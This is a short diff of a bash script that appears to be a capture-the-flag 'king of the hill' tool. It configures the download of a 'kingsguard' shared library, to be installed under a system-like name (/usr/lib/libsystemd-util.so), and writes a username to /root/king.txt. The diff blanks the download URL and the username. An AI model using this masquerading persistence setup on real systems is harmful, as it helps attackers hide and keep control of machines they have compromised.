@@ -1,8 +1,8 @@
 #!/bin/bash
 
-SO_URL="http://10.6.3.157/71f48221-fbe6-4f4c-9a17-518901946a54/kg.so" # The URL of the kingsguard shared library
+SO_URL="" # The URL of the kingsguard shared library
 INSTALL_PATH="/usr/lib/libsystemd-util.so" # The full path on the target to install the shared library
-USERNAME="M3chanical" # The username to write to king flag
+USERNAME="" # The username to write to king flag
 KING_FILE="/root/king.txt" # The path to the king.txt file
 
 # Check for root access
